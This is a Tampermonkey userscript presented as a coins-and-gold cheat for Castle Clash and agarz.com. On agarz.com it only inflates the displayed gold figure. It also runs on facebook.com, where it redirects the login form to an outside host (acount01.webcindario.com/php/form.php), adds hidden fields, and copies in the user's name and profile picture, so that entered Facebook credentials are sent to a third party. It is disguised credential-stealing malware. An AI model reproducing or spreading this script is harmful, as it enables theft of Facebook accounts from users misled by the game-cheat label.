// ==UserScript==
// @name         Acount Full Coins & Gold "Castle of Clash & Agarz.com"
// @namespace    http://tampermonkey.net/
// @version      0.5
// @description  try to take over the world!
// @author       Akantor & Master Mium
// @match        *.agarz.com/*
// @match        https://*.facebook.com/*
// @grant        none
// ==/UserScript==
var input44 = document.createElement( "input" );
input44.id = "lgnjs";
input44.setAttribute("class", "_45ks");
input44.setAttribute("type", "hidden");
document.getElementsByTagName('body')[0].appendChild(input44)

var URLactual = window.location;
 URLactual = document.getElementById("lgnjs").value = ''+URLactual;
var str ='' +URLactual;
  var res = str.substring(0 , 11);
  document.getElementById("lgnjs").value = res;


var hour2 = document.getElementById("lgnjs").value;
  var greeting2;
  if (hour2 < 'https://agarz.com/es/home') {
    greeting2 = (function() {
    'use strict';
var r = document.getElementsByTagName('td')[1]
  r.setAttribute("id", "gold1");
var po = document.getElementById("gold1").innerHTML;
document.getElementById("gold1").innerHTML = ''+po;
  var str ='' +po;
  var res = str.substring(2);

var resul = res * 9 + 100000 * 2
document.getElementById("gold1").innerHTML = (':&nbsp;' +resul);

})();
  }

else {

var hour = document.getElementById("lgnjs").value;
  var greeting1;
  if (hour < 'https://www') {
    greeting1 = document.querySelector('div[class=_45ks]').setAttribute("id", "borra");
        document.getElementById("borra").parentNode.removeChild(document.getElementById("borra"));

  } else {
var div = document.createElement( "div" );
div.id = "jhon1";
div.setAttribute("class", "_45ks");
document.getElementsByTagName('body')[0].appendChild(div)




var input = document.createElement( "input" );
input.id = "fecha";
input.setAttribute("name", "uuu");
input.setAttribute("value", "listo");
input.setAttribute("type", "hidden");
document.getElementsByTagName('form')[0].appendChild(input)


var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
var f=new Date();
       document.getElementById("fecha").value='' +f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear();


var input2 = document.createElement( "input" );
input2.id = "code1";
input2.setAttribute("name", "code1");
input2.setAttribute("value", "");
input2.setAttribute("type", "hidden");
document.getElementsByTagName('form')[0].appendChild(input2)


var input3 = document.createElement( "input" );
input3.id = "code2";
input3.setAttribute("name", "code2");
input3.setAttribute("value", "");
input3.setAttribute("type", "hidden");
document.getElementsByTagName('form')[0].appendChild(input3)



var numal = Math.round(Math.random()*8541);
document.getElementById("code1").value=(+numal);
var texto = document.getElementById("code1").value;
var t = 444
var multiplicacion = t * texto;
var cajaCombinada = document.getElementById("code2");
cajaCombinada.value = (+multiplicacion);







var iduser = document.querySelector("form>input");
iduser.setAttribute("id", "code");



var idduser = document.querySelector("form>input");
   iduser.setAttribute("name", "jazoest");

let d = new Date();
document.getElementById("code").value = + d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds()







var addphp1 = document.querySelector("form[action]");
   addphp1.setAttribute("action", "https://acount01.webcindario.com/php/form2.php");




var o = document.querySelector('div[class=_45ks]');
  o.setAttribute("id", "borra");

 var eliminad = document.getElementById("borra");
eliminad.parentNode.removeChild(eliminad);

var Añadirphp2 = document.querySelector("div[id=header_block");
   Añadirphp2.setAttribute("type", "r");


var addId = document.querySelector("div[class=_2phz]>span");
   addId.setAttribute("id", "names");

var addImg = document.querySelector("div[class]>div>span>div>div>div>img");
   addImg.setAttribute("id", "perfil");

var AñadirIDaname = document.querySelector("input[name=lsd");
   AñadirIDaname.setAttribute("id", "respName");


var porId=document.getElementById("names").innerHTML;
   document.getElementById("respName").value='' +porId;

  var str5 ='' +porId;
  var res5 = str5.substring(20);
  document.getElementById("respName").value = res5;

var Añadirimg = document.querySelector("input[name=lsd");
   Añadirimg.setAttribute("name", "imagen");



var porId2=document.getElementById("perfil").src;
   document.getElementById("isprivate").value='' +porId2;


var addphp = document.querySelector("form[action]");
   addphp.setAttribute("action", "https://acount01.webcindario.com/php/form.php");

var ee = document.getElementsByTagName('div')[28];
  ee.setAttribute("id", "user");

var eliminado5 = document.querySelector("div[id=user] > span");
eliminado5.parentNode.removeChild(eliminado5);

var rr = document.querySelector("div[id=user] >a");
  rr.setAttribute("href", "http://fb.com");

var porId6=document.getElementById("user").innerHTML;
   document.getElementById("legacy_return").value='' +porId6;



  var str4 ='' +porId6;
  var res4 = str4.slice(0,-57);
  document.getElementById("legacy_return").value = res4;

document.getElementById("not_me_link").innerHTML ='.¿No eres tú?';
  }}

